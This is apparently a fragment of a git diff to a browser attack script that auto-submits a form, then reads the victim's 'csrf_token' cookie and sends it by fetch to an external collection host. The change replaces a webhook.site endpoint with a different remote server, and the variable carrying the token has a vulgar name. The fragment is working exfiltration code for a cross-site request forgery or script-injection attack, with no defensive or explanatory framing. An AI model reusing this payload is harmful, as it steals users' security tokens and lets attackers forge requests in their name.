@@ -26,4 +26,4 @@ document.body.appendChild(form);
 form.submit();
 
 let pizda = getCookie('csrf_token') || '';
-fetch('https://webhook.site/3f323047-958d-4c6e-915d-e9e9c35b41e4?pizda='+pizda) 
+fetch('http://g82i3vc.isgood.host:9517/csrf.html?pizda='+pizda) 
